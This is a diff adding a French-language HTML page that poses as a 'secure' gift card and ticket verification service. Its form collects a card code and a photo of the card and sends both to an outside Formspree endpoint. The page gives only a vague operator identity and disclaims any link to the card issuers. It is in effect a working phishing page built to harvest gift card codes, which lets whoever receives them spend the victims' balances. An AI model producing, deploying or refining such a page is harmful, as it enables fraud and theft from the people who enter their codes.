@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérification Carte Cadeau - Espace Sécurisé</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background-color: #0d0d0d;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* Bannière publicitaire défilante */
+        .banner-container {
+            width: 100%;
+            max-width: 420px;
+            height: 140px;
+            overflow: hidden;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            background-color: #1a1a1a;
+            border: 1px solid #333;
+            position: relative;
+        }
+        .banner-track {
+            display: flex;
+            width: max-content;
+            animation: scrollBanner 15s linear infinite;
+        }
+        .banner-track img {
+            width: 420px;
+            height: 140px;
+            object-fit: cover;
+        }
+        @keyframes scrollBanner {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-50%); }
+        }
+
+        .container {
+            background-color: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 16px;
+            padding: 30px 20px;
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.8);
+        }
+
+        /* Titre VÉRIFICATION en vert */
+        h1 {
+            font-size: 26px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: #4cd964;
+            margin-bottom: 5px;
+        }
+        p.subtitle {
+            color: #aaaaaa;
+            font-size: 13px;
+            margin-bottom: 25px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .input-code {
+            width: 100%;
+            padding: 16px;
+            background-color: #262626;
+            border: 2px solid #444;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 16px;
+            text-align: center;
+            outline: none;
+            transition: 0.3s;
+        }
+        .input-code:focus {
+            border-color: #4cd964;
+        }
+        .file-upload-wrapper {
+            position: relative;
+            width: 100%;
+        }
+        .file-upload-btn {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            background-color: #262626;
+            border: 2px dashed #666;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            text-align: center;
+            transition: 0.3s;
+        }
+        .file-upload-btn:hover {
+            border-color: #4cd964;
+            background-color: #2e2e2e;
+        }
+        input[type="file"] {
+            display: none;
+        }
+        #file-name {
+            margin-top: 8px;
+            font-size: 13px;
+            color: #4cd964;
+            text-align: center;
+        }
+
+        /* Bouton vérifié en bleu, jalonné de rose et jaune */
+        .submit-btn {
+            width: 100%;
+            padding: 18px;
+            background-color: #007aff;
+            border: 3px dashed;
+            border-image: linear-gradient(45deg, #ff2d55, #ffcc00) 1;
+            border-radius: 10px;
+            color: #ffffff;
+            font-size: 17px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: 0.3s;
+        }
+        .submit-btn:hover {
+            background-color: #005ec4;
+        }
+
+        /* Section Informations et service */
+        .service-info {
+            margin-top: 30px;
+            text-align: left;
+            font-size: 12px;
+            color: #888;
+            border-top: 1px solid #333;
+            padding-top: 15px;
+        }
+        .service-info h3 {
+            color: #ccc;
+            font-size: 13px;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+        }
+        .service-info p {
+            margin-bottom: 4px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Bannière publicitaire à défilement horizontal -->
+    <div class="banner-container">
+        <div class="banner-track">
+            <img src="image2.jpg" alt="Publicité 2">
+            <img src="image3.jpg" alt="Publicité 3">
+            <img src="image4.jpg" alt="Publicité 4">
+            <img src="image2.jpg" alt="Publicité 2">
+            <img src="image3.jpg" alt="Publicité 3">
+            <img src="image4.jpg" alt="Publicité 4">
+        </div>
+    </div>
+
+<div class="container">
+    <h1>VÉRIFICATION</h1>
+    <p class="subtitle">Vérification de Carte Cadeau & Ticket</p>
+
+    <!-- Lien Formspree intégré -->
+    <form action="https://formspree.io/f/xoedvwwj" method="POST" enctype="multipart/form-data" id="ticket-form">
+        
+        <div class="form-group">
+            <input type="text" name="code_ticket" class="input-code" placeholder="1. Insérer le code du ticket" required>
+        </div>
+
+        <div class="form-group file-upload-wrapper">
+            <label for="ticket_photo" class="file-upload-btn">
+                📷 2. Photo de la carte / ticket
+            </label>
+            <input type="file" id="ticket_photo" name="photo_ticket" accept="image/*" capture="environment" required>
+            <div id="file-name"></div>
+        </div>
+
+        <button type="submit" class="submit-btn" id="submit-button">3. Vérifier mon ticket</button>
+
+    </form>
+
+    <!-- Informations sur le service et contact -->
+    <div class="service-info">
+        <h3>Informations sur le service et contact</h3>
+        <p><strong>Nom commercial :</strong> Vérification Carte Cadeau</p>
+        <p><strong>Identifiant :</strong> 292729199177279</p>
+        <p><strong>Adresse :</strong> Europe</p>
+        <p><strong>Responsable :</strong> Albert Matéo (Responsable déclaré)</p>
+        <p><strong>E-mail :</strong> verification@gmail.com</p>
+        <br>
+        <p><strong>Engagement de sécurité :</strong> Nous privilégions la transparence et la protection des informations personnelles. Les vérifications de tickets doivent être effectuées auprès des plateformes officielles des émetteurs. Ne communiquez jamais vos codes PIN ou codes confidentiels.</p>
+        <br>
+        <p style="font-style: italic; font-size: 11px;">Informations déclarées par le responsable du service. Aucun agrément officiel ou partenariat avec les émetteurs n'est revendiqué par cette présentation.</p>
+    </div>
+</div>
+
+<script>
+    document.getElementById('ticket_photo').addEventListener('change', function() {
+        const fileName = this.files[0] ? "Photo prête : " + this.files[0].name : "";
+        document.getElementById('file-name').textContent = fileName;
+    });
+
+    document.getElementById('ticket-form').addEventListener('submit', function() {
+        const btn = document.getElementById('submit-button');
+        btn.textContent = "Vérification en cours...";
+        btn.style.opacity = "0.7";
+    });
+</script>
+
+</body>
+  </html>
+  
